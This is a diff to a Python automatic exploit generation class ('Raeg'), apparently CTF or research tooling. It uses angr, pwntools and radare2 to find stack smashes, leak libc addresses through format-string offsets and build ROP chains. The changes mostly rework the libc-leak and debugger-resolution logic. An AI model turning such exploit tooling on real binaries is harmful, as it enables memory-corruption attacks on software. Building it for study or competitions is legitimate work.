@@ -34,7 +34,7 @@ class Raeg:
     # Initialize class variables that are important here
     def __init__(self, binary_path, libc_path):
         self.binary = binary_path
-        self.elf = context.binary =  ELF(binary_path)
+        self.elf = context.binary = ELF(binary_path)
         self.libc = context.binary = ELF(libc_path)
 
         self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
@@ -48,7 +48,7 @@ class Raeg:
 
         self.symbolic_padding = None
 
-        self.libc_offset_string = "%p"
+        self.libc_offset_string = ""
         self.canary_offset_string = None
         self.format_write_address = None
 
@@ -101,6 +101,7 @@ class Raeg:
                 logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
             else:
                 self.angry_stack_smash()
+                self.generate_rop_chain()
 
 
         else:
@@ -175,7 +176,8 @@ class Raeg:
                         simgr.stashes["mem_corrupt"].append(path)
                     except ValueError:
                         log.warning("Could not find index of pc overwrite")
-                        #log.info(f"{stack_smash}")
+
+
                 simgr.stashes["unconstrained"].remove(path)
                 simgr.drop(stash="active")
 
@@ -419,6 +421,10 @@ class Raeg:
     def rop_libc(self):
         p = process(self.binary)
 
+        f = open("./format.txt", "w+")
+        f.write(self.libc_offset_string + "\n")
+
+
 
         prompt = p.recvline()
         if b"Leak" in prompt:
@@ -426,9 +432,10 @@ class Raeg:
             log.info(f"Libc address leaked {hex(self.leak)}")
             self.resolve_libc_offset()
         else:
+            if self.libc_offset_string != None:
+                p.sendline(bytes(self.libc_offset_string, "utf-8"))
 
-            if self.offset_str != None:
-                p.sendline(bytes(self.offset_str, "utf-8"))
+                self.resolve_libc_offset()
 
 
 
@@ -447,7 +454,6 @@ class Raeg:
         else:
             self.rop_chain =  self.rop_chain_call_function(self.exploit_function, self.parameters)
 
-        return None
 
     def format_leak(self):
         logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
@@ -487,7 +493,8 @@ class Raeg:
 
                     libc_leak = re.search(r"0x7f[a-f0-9]{8}4a", address)
                     if libc_leak:
-                        self.libc_offset_string = offset_str
+                        self.libc_offset_string = offset_str.split(".")[0]
+                        self.has_libc_leak = True
                         logging.getLogger("pwnlib").setLevel(logging.INFO)
                         log.info(f"Found libc leak for libc_start_main at offset {i}:{address}")
                         logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
@@ -525,43 +532,43 @@ class Raeg:
     def resolve_libc_offset(self):
 
         print(self.libc_offset_string)
-        self.r2 = r2pipe.open(self.binary, flags=["-d", "rarun2", f"program={self.binary}", f"stdin=./test"])
+        self.r2 = r2pipe.open(self.binary, flags=["-d", "rarun2", f"program={self.binary}", f"stdin=./format.txt"])
 
 
         # Random r2pipe commands that gets the memory map of the libc base and runs the program for the leak
 
         self.r2.cmd("aa")
         self.r2.cmd("dcu main")
-        self.r2.cmd("dm | grep libc -m 1")
-        libc_base_debug = self.r2.cmd("dc")#.split("\n")[1].split(" ")[0]
-        self.r2.cmd("dc")
-        debug_output = self.r2.cmd("aa")
-        self.r2.cmd("aa")
-        self.r2.cmd("dc")
-        self.r2.cmd("aa")
+        command_buffer = []
+        command_buffer.append(self.r2.cmd("dm | grep libc.so -m 1"))
+        command_buffer.append(self.r2.cmd("dc"))
+        command_buffer.append(self.r2.cmd("dc"))
+        command_buffer.append(self.r2.cmd("aa"))
+        command_buffer.append(self.r2.cmd("aa"))
 
-        #set logging file ./pwndbg.log
-        #set logging enabled on
+        for command in command_buffer:
+            if "libc" in command:
+                libc_base_debug = command
+                print(libc_base_debug)
+            if "Leak" in command:
+                debug_output = command
+                print(debug_output)
 
 
-        log.info("Found output in debugger")
-        print(debug_output)
-        log.info("Found libc in debugger")
-        print(libc_base_debug)
 
-        log.info("Found libc in debugger")
-        for line in libc_base_debug.split("\n"):
-            print(line)
+        #start_addr = self.elf.sym["main"]
 
-        gs = '''
-            init-pwndbg
-            b main
-            set context-sections disasm
-            vmmap libc
-        '''
+        #state = self.proj.factory.entry_state(
+            #addr=start_addr,
+            #stdin=self.libc_offset_string
+        #)
 
-        #p = gdb.debug(self.binary, gdbscript=gs)
-        #p.sendline(bytes(self.libc_offset_string, "utf-8"))
+
+
+
+        #debug_leak = None
+
+
 
         return None
 
